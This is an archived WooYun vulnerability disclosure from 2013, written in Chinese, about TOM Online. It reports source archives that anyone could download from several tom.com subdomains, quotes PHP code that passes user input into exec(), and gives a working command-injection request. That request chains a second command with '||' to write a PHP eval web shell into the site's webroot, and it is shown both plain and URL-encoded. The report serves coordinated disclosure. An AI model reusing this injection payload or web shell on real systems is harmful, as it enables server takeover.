<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		TOM在线某运维缺陷导致任意命令执行  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		TOM在线某运维缺陷导致任意命令执行  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/felixk3y">felixk3y</a> 
</li><li>提交时间：		2013-12-23 17:49</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-12-23：	细节已通知厂商并且等待厂商处理中<br/>
									2013-12-24：	厂商已经确认，细节仅向厂商公开<br/>
									2014-01-03：	细节向核心白帽子及相关领域专家公开<br/>
									2014-01-13：	细节向普通白帽子公开<br/>
									2014-01-23：	细节向实习白帽子公开<br/>
									2014-02-06：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">对Tom在线的运维缺陷加以利用直接导致命令执行</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">@xsser 刚才发的那个TOM任意文件上传,我知道是已经提交过的,但厂商没有修复,麻烦再通知下厂商,谢谢.<br />
<br />
对这个漏洞我真不想说什么了,运维的、写代码真的应该好好给他们洗洗脑...<br />
<br />
#1 好多个网站的源代码任意下载<br />
<br />
</p><pre><code>http://post.news.tom.com/post.tar.gz<br />
http://post.tom.com/post.tar.gz<br />
http://post.weiqi.tom.com/post.tar.gz<br />
http://post.auto.tom.com/post.tar.gz<br />
http://post.she.tom.com/post.tar.gz</code></pre><p class='detail'><br />
<br />
应该还没列完,好好检查下。<br />
<br />
#2 解压post.tar.gz<br />
<br />
</p><pre><code>C:\Users\Administrator\Desktop\code 的目录<br />
2013/12/23  17:07    &lt;DIR&gt;          .<br />
2013/12/23  17:07    &lt;DIR&gt;          ..<br />
2013/12/23  16:02    &lt;DIR&gt;          .svn<br />
2013/12/23  16:02    &lt;DIR&gt;          ajax<br />
2013/12/23  16:02    &lt;DIR&gt;          cache<br />
2013/12/23  16:03    &lt;DIR&gt;          channel<br />
2013/12/23  16:02    &lt;DIR&gt;          class<br />
2013/12/23  16:02    &lt;DIR&gt;          cmslog<br />
2013/12/23  16:02    &lt;DIR&gt;          cmslog2<br />
2013/12/23  16:02    &lt;DIR&gt;          cmslog3<br />
2013/12/23  16:02    &lt;DIR&gt;          config<br />
2013/12/23  16:02    &lt;DIR&gt;          cron<br />
2013/12/23  16:02    &lt;DIR&gt;          dyp<br />
2013/12/23  16:03    &lt;DIR&gt;          functions<br />
2013/12/23  16:02    &lt;DIR&gt;          help<br />
2013/12/23  16:03    &lt;DIR&gt;          images<br />
2013/12/23  16:03    &lt;DIR&gt;          img_tmp<br />
2013/12/23  16:03    &lt;DIR&gt;          include<br />
2013/12/23  16:02    &lt;DIR&gt;          index<br />
2013/12/23  16:02    &lt;DIR&gt;          infchannel<br />
2013/12/23  16:03    &lt;DIR&gt;          interface<br />
2013/12/23  16:02    &lt;DIR&gt;          lib<br />
2013/12/23  16:02    &lt;DIR&gt;          log<br />
2013/12/23  16:02    &lt;DIR&gt;          post<br />
2013/12/23  16:02    &lt;DIR&gt;          qa<br />
2013/12/23  16:02    &lt;DIR&gt;          related_news_cache<br />
2013/12/23  16:03    &lt;DIR&gt;          script<br />
2013/12/23  16:02    &lt;DIR&gt;          shell<br />
2013/12/23  16:02    &lt;DIR&gt;          style<br />
2013/12/23  16:02    &lt;DIR&gt;          template<br />
2013/12/23  16:02    &lt;DIR&gt;          test<br />
2013/12/23  16:03    &lt;DIR&gt;          testjs<br />
2013/12/23  16:02    &lt;DIR&gt;          tmp<br />
2013/12/23  16:03    &lt;DIR&gt;          userface<br />
2011/08/01  15:56            12,288 .鏂板崕缃_0110614-20110615_.txt.swp<br />
2009/03/25  17:17            79,215 4A000A95112.html<br />
2011/06/24  13:36            15,583 778DV6L3.html<br />
2010/08/04  14:28                 0 a.txt<br />
2009/03/25  17:16               623 aa.html<br />
2009/03/25  17:16               280 aa.php<br />
2013/12/23  17:09             2,145 accFace.php<br />
2009/03/25  17:16            52,383 ag.php<br />
2011/06/24  17:44            71,786 article_gallery_special.php<br />
2011/07/12  13:22            71,085 article_gallery_special2011bai.php<br />
2010/04/22  18:13            65,989 article_gallery_special_t.php<br />
2010/09/16  10:59            69,760 article_gallery_v2.php<br />
2009/03/25  17:17            57,872 article_gallery_v2_t.php<br />
2011/06/25  11:09            73,872 article_special.php<br />
2011/01/05  16:51            72,558 article_special2.php<br />
2011/07/27  14:56            73,943 article_special20110726.php<br />
2011/07/21  18:52            75,839 article_special2011bai.php<br />
2011/07/21  18:21            75,839 article_special2011bai1.php<br />
2011/01/28  11:07            73,794 article_special3.php<br />
2011/06/24  14:19            74,136 article_special4.php<br />
2009/08/14  11:09            73,268 article_special_test.php<br />
2009/03/25  17:17            57,659 article_t.php<br />
2009/03/25  17:17            85,644 article_v3.html<br />
2009/03/25  17:17            56,547 article_v3_20090120_wd_bak.php<br />
2010/09/17  17:03            70,262 article_v5.php<br />
2009/09/28  14:30            66,067 article_v5_t.php<br />
2010/07/27  13:00                89 asx.php<br />
2011/03/02  17:26               867 auto_delete_nandu.php<br />
2011/02/25  17:33               134 auto_delete_nandu.sh<br />
2010/06/29  10:24                 0 b<br />
2009/08/20  17:00             1,553 batchcomment.php<br />
2009/03/25  17:17             4,169 bot.php<br />
2009/03/25  17:16             3,046 cn.php<br />
2009/08/10  09:13            30,870 comment.php<br />
2009/03/25  17:16            10,297 common.functions.php<br />
2010/06/03  15:32            11,191 del.txt<br />
2010/08/03  11:19            27,222 delete<br />
2011/08/30  15:47         2,299,080 deleteSucc.log<br />
2011/02/24  17:34                38 deletetmp.txt<br />
2009/03/25  17:16             3,737 doCatalog.php<br />
2009/03/25  17:17             1,364 doDeleteArticle.php<br />
2009/03/25  17:16               999 doLogin.test.php<br />
2009/03/25  17:16             1,421 doRegister.php<br />
2009/03/25  17:17             3,938 doUpdateUser.php<br />
2009/09/03  12:08             3,665 doUploadArticleImg.php<br />
2010/04/22  11:01             3,636 doUploadImage.php<br />
2009/09/03  13:11             3,740 duai.php<br />
2010/06/07  15:18                19 env.php<br />
2009/03/25  17:16             1,150 favicon.ico<br />
2011/08/04  09:56               752 fazhi20110804.txt<br />
2009/03/25  17:17             1,477 foreign.php<br />
2009/03/25  17:16            22,414 g.php<br />
2009/08/18  11:26            18,654 gallery.php<br />
2009/07/06  17:29            24,891 gallery_bak.php<br />
2009/07/09  14:21            18,660 gallery_t.php<br />
2010/03/30  10:11               271 gettangyuan.php<br />
2009/11/20  17:08             2,806 HanroadClass.php<br />
2009/07/08  15:54             1,435 hwbang.php<br />
2009/03/25  17:16               584 hwrec.php<br />
2009/07/08  15:54             1,487 hwtag.php<br />
2009/03/25  17:17             1,111 hyperwords.php<br />
2009/07/24  17:57             2,362 index.html<br />
2011/08/30  13:00            13,037 index.php<br />
2009/03/25  17:17            12,757 index1.html<br />
2009/03/25  17:16               311 indexStat.php<br />
2009/07/06  18:46            61,822 index_voice.php<br />
2009/07/06  18:23            61,494 index_voice_bak.php<br />
2009/03/25  17:16                25 ip.php<br />
2010/07/07  15:28             1,245 j<br />
2010/07/07  15:30            10,588 j1<br />
2010/07/07  15:25            36,553 jhsblynew<br />
2010/07/07  15:25             8,172 jhsbzwnew<br />
2009/03/25  17:17               730 link.php<br />
2009/06/01  20:27               523 log.php<br />
2009/07/24  17:53             2,926 login.php<br />
2009/03/25  17:17               693 logout.php<br />
2010/11/03  16:52             3,114 main.inc.php<br />
2009/03/25  17:16             1,807 manageArticle.php<br />
2009/03/25  17:16             1,059 manageArticleByCatalog.php<br />
2009/03/25  17:17               667 manageCatalog.php<br />
2009/03/25  17:17               630 manageUser.php<br />
2009/03/25  17:17               597 modify_list<br />
2009/03/25  17:17               428 msg.html<br />
2011/02/24  18:19            24,599 nandu_end.txt<br />
2011/02/28  15:47               191 nandu_end2011-02-28.txt<br />
2011/03/30  15:47               152 nandu_end2011-03-30.txt<br />
2011/03/31  15:47               152 nandu_end2011-03-31.txt<br />
2011/04/30  15:47                86 nandu_end2011-04-30.txt<br />
2011/05/30  15:47               154 nandu_end2011-05-30.txt<br />
2011/05/31  15:47               154 nandu_end2011-05-31.txt<br />
2011/06/01  15:47                 0 nandu_end2011-06-01.txt<br />
2011/06/02  15:47                13 nandu_end2011-06-02.txt<br />
2011/06/03  15:47                13 nandu_end2011-06-03.txt<br />
2011/06/04  15:47                13 nandu_end2011-06-04.txt<br />
2011/06/05  15:47                13 nandu_end2011-06-05.txt<br />
2011/06/06  15:47                13 nandu_end2011-06-06.txt<br />
2011/06/07  15:47                13 nandu_end2011-06-07.txt<br />
2011/06/08  15:47                13 nandu_end2011-06-08.txt<br />
2011/06/09  15:47                13 nandu_end2011-06-09.txt<br />
2011/06/10  15:47                26 nandu_end2011-06-10.txt<br />
2011/06/11  15:47                26 nandu_end2011-06-11.txt<br />
2011/06/12  15:47                26 nandu_end2011-06-12.txt<br />
2011/06/13  15:47                39 nandu_end2011-06-13.txt<br />
2011/06/14  15:47                39 nandu_end2011-06-14.txt<br />
2011/06/15  15:47                52 nandu_end2011-06-15.txt<br />
2011/06/16  15:47                65 nandu_end2011-06-16.txt<br />
2011/06/17  15:47                78 nandu_end2011-06-17.txt<br />
2011/06/18  15:47                78 nandu_end2011-06-18.txt<br />
2011/06/19  15:47                78 nandu_end2011-06-19.txt<br />
2011/06/20  15:47                91 nandu_end2011-06-20.txt<br />
2011/06/21  15:47                91 nandu_end2011-06-21.txt<br />
2011/06/22  15:47                91 nandu_end2011-06-22.txt<br />
2011/06/23  15:47                91 nandu_end2011-06-23.txt<br />
2011/06/24  15:47                91 nandu_end2011-06-24.txt<br />
2011/06/25  15:47                91 nandu_end2011-06-25.txt<br />
2011/06/26  15:47                91 nandu_end2011-06-26.txt<br />
2011/06/27  15:47               116 nandu_end2011-06-27.txt<br />
2011/06/28  15:47               116 nandu_end2011-06-28.txt<br />
2011/06/29  15:47               116 nandu_end2011-06-29.txt<br />
2011/06/30  15:47               116 nandu_end2011-06-30.txt<br />
2011/07/01  15:47                13 nandu_end2011-07-01.txt<br />
2011/07/02  15:47                26 nandu_end2011-07-02.txt<br />
2011/07/03  15:47                26 nandu_end2011-07-03.txt<br />
2011/07/04  15:47                50 nandu_end2011-07-04.txt<br />
2011/07/05  15:47                50 nandu_end2011-07-05.txt<br />
2011/07/06  15:47                86 nandu_end2011-07-06.txt<br />
2011/07/07  15:47                86 nandu_end2011-07-07.txt<br />
2011/07/08  15:47               110 nandu_end2011-07-08.txt<br />
2011/07/09  15:47               110 nandu_end2011-07-09.txt<br />
2011/07/10  15:47               110 nandu_end2011-07-10.txt<br />
2011/07/11  15:47               110 nandu_end2011-07-11.txt<br />
2011/07/12  15:47               110 nandu_end2011-07-12.txt<br />
2011/07/13  15:47               110 nandu_end2011-07-13.txt<br />
2011/07/14  15:47               110 nandu_end2011-07-14.txt<br />
2011/07/15  15:47               110 nandu_end2011-07-15.txt<br />
2011/07/16  15:47               110 nandu_end2011-07-16.txt<br />
2011/07/17  15:47               110 nandu_end2011-07-17.txt<br />
2011/07/18  15:47               110 nandu_end2011-07-18.txt<br />
2011/07/19  15:47               110 nandu_end2011-07-19.txt<br />
2011/07/20  15:47               110 nandu_end2011-07-20.txt<br />
2011/07/21  15:47               110 nandu_end2011-07-21.txt<br />
2011/07/22  15:47               110 nandu_end2011-07-22.txt<br />
2011/07/23  15:47               110 nandu_end2011-07-23.txt<br />
2011/07/24  15:47               110 nandu_end2011-07-24.txt<br />
2011/07/25  15:47               110 nandu_end2011-07-25.txt<br />
2011/07/26  15:47               121 nandu_end2011-07-26.txt<br />
2011/07/27  15:47               146 nandu_end2011-07-27.txt<br />
2011/07/28  15:47               159 nandu_end2011-07-28.txt<br />
2011/07/29  15:47               159 nandu_end2011-07-29.txt<br />
2011/07/30  15:47               159 nandu_end2011-07-30.txt<br />
2011/07/31  15:47               159 nandu_end2011-07-31.txt<br />
2011/08/01  15:47                 0 nandu_end2011-08-01.txt<br />
2011/08/02  15:47                 0 nandu_end2011-08-02.txt<br />
2011/08/03  15:47                 0 nandu_end2011-08-03.txt<br />
2011/08/04  15:47                 0 nandu_end2011-08-04.txt<br />
2011/08/05  15:47                 0 nandu_end2011-08-05.txt<br />
2011/08/06  15:47                 0 nandu_end2011-08-06.txt<br />
2011/08/07  15:47                 0 nandu_end2011-08-07.txt<br />
2011/08/08  15:47                 0 nandu_end2011-08-08.txt<br />
2011/08/09  15:47                12 nandu_end2011-08-09.txt<br />
2011/08/10  15:47                12 nandu_end2011-08-10.txt<br />
2011/08/11  15:47                12 nandu_end2011-08-11.txt<br />
2011/08/12  15:47                12 nandu_end2011-08-12.txt<br />
2011/08/13  15:47                12 nandu_end2011-08-13.txt<br />
2011/08/14  15:47                12 nandu_end2011-08-14.txt<br />
2011/08/15  15:47                12 nandu_end2011-08-15.txt<br />
2011/08/16  15:47                12 nandu_end2011-08-16.txt<br />
2011/08/17  15:47                25 nandu_end2011-08-17.txt<br />
2011/08/18  15:47                25 nandu_end2011-08-18.txt<br />
2011/08/19  15:47                25 nandu_end2011-08-19.txt<br />
2011/08/20  15:47                25 nandu_end2011-08-20.txt<br />
2011/08/21  15:47                25 nandu_end2011-08-21.txt<br />
2011/08/22  15:47                25 nandu_end2011-08-22.txt<br />
2011/08/23  15:47                38 nandu_end2011-08-23.txt<br />
2011/08/24  15:47                38 nandu_end2011-08-24.txt<br />
2011/08/25  15:47                50 nandu_end2011-08-25.txt<br />
2011/08/26  15:47                63 nandu_end2011-08-26.txt<br />
2011/08/27  15:47                63 nandu_end2011-08-27.txt<br />
2011/08/28  15:47                63 nandu_end2011-08-28.txt<br />
2011/08/29  15:47                63 nandu_end2011-08-29.txt<br />
2011/08/30  15:47                63 nandu_end2011-08-30.txt<br />
2011/01/19  16:49             8,336 nandu_new.txt<br />
2011/02/25  16:37                24 nandu_new1.txt<br />
2011/02/24  18:10            26,631 nandu_trans.txt<br />
2010/06/28  14:53               611 ndylzkbak<br />
2010/06/28  14:53               579 ndzkbak<br />
2009/04/08  18:18               201 new<br />
2009/04/02  15:42               850 new.php<br />
2009/03/25  17:16            46,029 newsearch.php<br />
2009/09/04  10:20             1,272 NewsEdit.html<br />
2009/03/25  17:17            46,415 ourgame.php<br />
2009/06/16  15:39            64,022 ourgame_gallery.php<br />
2009/06/15  13:15            66,174 ourgame_v2.php<br />
2009/05/31  10:54            18,343 out.txt<br />
2009/03/25  17:16             3,186 pass_indexlogin.js<br />
2009/03/25  17:17             4,262 pdnav.js<br />
2009/03/25  17:17               614 pfprt.php<br />
2009/03/25  17:17            31,233 pn.php<br />
2009/07/09  17:33             3,891 PostCollector.php<br />
2009/08/01  17:28             6,284 PPCache.php<br />
2009/11/03  16:56            28,937 publish_news.php<br />
2010/06/07  16:11            29,522 publish_news_t.php<br />
2009/04/08  16:54            34,624 publish_news_v2.php<br />
2011/04/06  17:49           180,587 qingnianbao_res.txt<br />
2011/04/08  08:56            59,768 qingnianbao_res1.txt<br />
2009/03/25  17:16             2,169 redirect.php<br />
2009/03/25  17:17             2,174 redirect8.php<br />
2009/03/25  17:16             2,209 redirect8_test.php<br />
2009/03/25  17:17               813 register.php<br />
2010/05/28  19:48             3,131 renming<br />
2009/03/25  17:16            21,551 scriptt<br />
2009/03/25  17:17               673 search.php<br />
2009/03/25  17:17               685 searchUtf8.php<br />
2011/05/12  10:08               577 Search_agent.html<br />
2009/03/25  17:16                54 sitemap.html<br />
2009/03/25  17:16           138,275 sk.html<br />
2009/03/25  17:16           304,774 sk.js<br />
2009/03/25  17:17           304,799 sk1.js<br />
2011/01/28  12:06             1,510 snooker_weibo.html<br />
2009/03/25  17:16            77,809 sport_vote_1.html<br />
2009/03/25  17:17             1,181 status.php<br />
2009/03/25  17:17            91,784 t.html<br />
2009/04/13  13:17            65,423 t.php<br />
2009/08/26  15:38               209 t0.php<br />
2009/04/15  14:15             2,604 t1.php<br />
2009/03/25  17:17               842 t2.php<br />
2009/08/28  15:52             6,275 tag.php<br />
2009/08/28  15:51             6,088 tag1.php<br />
2009/08/28  15:47             6,147 tag20080320.php<br />
2009/03/25  17:17             4,187 tag_list_comments.php<br />
2009/03/25  17:16             4,488 tag_list_digs.php<br />
2009/03/25  17:16             4,212 tag_list_tramples.php<br />
2009/03/25  17:17           109,674 test.html<br />
2011/08/04  10:08               455 test.php<br />
2010/05/28  20:02             2,747 test.txt<br />
2011/07/18  17:47               147 test2.php<br />
2010/06/03  15:40             2,917 test2.txt<br />
2009/03/25  17:17               388 test_article_list.php<br />
2011/06/28  10:24               373 test_cao.php<br />
2009/08/04  18:00             4,848 test_cms.html<br />
2009/03/25  17:16             4,078 top.php<br />
2009/03/25  17:17             4,053 top1h.php<br />
2009/06/29  10:24             6,853 TPPClient.php<br />
2009/04/09  16:29               159 trip.php<br />
2009/03/25  17:16               832 tt.html<br />
2009/04/10  11:39             1,169 tt.php<br />
2009/03/25  17:16             2,771 uai.php<br />
2009/09/03  11:55             2,683 uai_t.php<br />
2009/09/08  10:58               932 update.php<br />
2009/08/28  10:48             1,335 updatesmall.php<br />
2009/09/03  13:25             2,476 uploadArticleImg.php<br />
2009/09/22  09:45             4,832 user.php<br />
2009/11/03  14:42             4,509 userInfo.php<br />
2009/03/25  17:16               757 vimrc<br />
2010/10/15  14:20                39 wcf<br />
2010/10/13  10:41               477 wcf.php<br />
2010/10/15  14:21                39 wcfanother<br />
2010/10/15  14:22                39 wcfanother11<br />
2010/10/15  14:20                39 wcfdefault<br />
2009/03/25  17:16            57,881 weekend.php<br />
2009/03/25  17:16             1,002 weekend_x.php<br />
2011/06/15  11:27                81 xinhua20110614-20110615.txt<br />
2011/06/15  11:20                84 xinhua20110614-20110615_.txt<br />
2011/06/28  10:22             2,883 xinhua20110616-0628_new.txt<br />
2011/06/28  15:48             2,663 xinhua20110616-0628_new_res.txt<br />
2011/06/28  09:54             5,594 xinhua20110616.txt<br />
2011/06/28  10:00            16,073 xinhua20110616_res.txt<br />
2010/08/03  20:02               307 zgxwzk<br />
2011/07/08  14:49            73,872 拷贝于 article_special.php<br />
2011/06/15  11:20                84 鏂板崕缃_0110614-20110615_.txt</code></pre><p class='detail'> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">#3 对下载的代码进行简单审计<br />
<br />
根目录下的accFace.php文件<br />
<br />
</p><pre><code>&lt;?php<br />
//...<br />
$faceName = urldecode(trim($_GET[&#039;faceName&#039;]));<br />
$tmpPath = urldecode(trim($_GET[&#039;tmpPath&#039;]));<br />
if (get_magic_quotes_gpc()) {<br />
    $faceName = stripslashes($faceName);<br />
    $tmpPath = stripslashes($tmpPath);<br />
    $localPath = stripslashes($localPath);<br />
}<br />
$subPath = $FACE_LOCAL_PATH.preg_replace(&#039;/\\/[^\\/]+?\\w$/i&#039;, &#039;&#039;, $faceName);<br />
if (!file_exists($subPath)) {<br />
    @exec(&quot;mkdir -p $subPath&quot;);<br />
}<br />
$commandDesc = &quot;wget -O $FACE_LOCAL_PATH$faceName $tmpPath$faceName&quot;;<br />
exec($commandDesc);<br />
//生成缩略图<br />
resizeImage($FACE_LOCAL_PATH.$faceName, $FACE_LOCAL_PATH.str_replace(&#039;.&#039;, &#039;_s.&#039;, $faceName), $RESIZE_WIDTH, $RESIZE_HEIGHT);<br />
?&gt;</code></pre><p class='detail'><br />
<br />
65-67行：<br />
<br />
</p><pre><code>if (!file_exists($subPath)) {<br />
    @exec(&quot;mkdir -p $subPath&quot;);//一看就知道是C程序员写的, exec啊,其实吧,php有相应函数的....<br />
}</code></pre><p class='detail'><br />
<br />
$subPath没过滤,导致任意命令执行...<br />
<br />
<br />
<br />
#4 利用吧<br />
<br />
直接访问accFace.php爆出绝对路径,好吧 那我们就写个shell进去...<br />
<br />
</p><p class="detail"><a href="../images/231717555f245a70c4f612f30f95f1ae478ad49b.jpg" target="_blank"><img src="../images/231717555f245a70c4f612f30f95f1ae478ad49b.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
<br />
我们构造faceName参数为：<br />
<br />
</p><pre><code>aa || echo &#039;&lt;?php eval($_POST[#]);?&gt;It works&#039; &gt;/data/webroot/post/tom.php</code></pre><p class='detail'><br />
<br />
Encode 下：<br />
<br />
</p><pre><code>aa%20%7C%7C%20echo%20&#039;&lt;%3Fphp%20eval(%24_POST%5Bcmd%5D)%3B%3F&gt;It%20works&#039;%20&gt;%2Fdata%2Fwebroot%2Fpost%2Ftom.php</code></pre><p class='detail'><br />
<br />
GET提交：<br />
<br />
</p><pre><code>http://post.news.tom.com/accFace.php?faceName=aa%20%7C%7C%20echo%20&#039;%3C%3Fphp%20eval(%24_POST%5Bcmd%5D)%3B%3F%3EIt%20works&#039;%20%3E%2Fdata%2Fwebroot%2Fpost%2Ftom.php&amp;tmpPath=1&amp;localPath=1</code></pre><p class='detail'><br />
<br />
命令执行了,在根目录下生产tom.php<br />
<br />
</p><p class="detail"><a href="../images/23173319afd35f3605aea93aa4fe1aa122588f58.jpg" target="_blank"><img src="../images/23173319afd35f3605aea93aa4fe1aa122588f58.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
<br />
#5 shell show<br />
<br />
</p><p class="detail"><a href="../images/23173450a958842e187417f394144bee68a15c27.jpg" target="_blank"><img src="../images/23173450a958842e187417f394144bee68a15c27.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">备份文件删或改,代码好好检查下.哈哈 帮你们找到个那么严重的漏洞,有礼物否... </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/felixk3y" title="felixk3y">felixk3y</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046823" title="TOM在线某运维缺陷导致任意命令执行">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：13 </p>
													<p class="detail">确认时间：2013-12-24 10:58</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">非常感谢您对TOM在线的帮助，我们会尽快做出处理。我们为支持TOM在线的发布者创建了一个技术交流QQ群：328442670，希望您以及更多的成员加入，大家共同交流。同时TOM在线在通过公司申请后会不定期发送礼品给发布者，以表您对TOM在线的支持。</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="46823";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
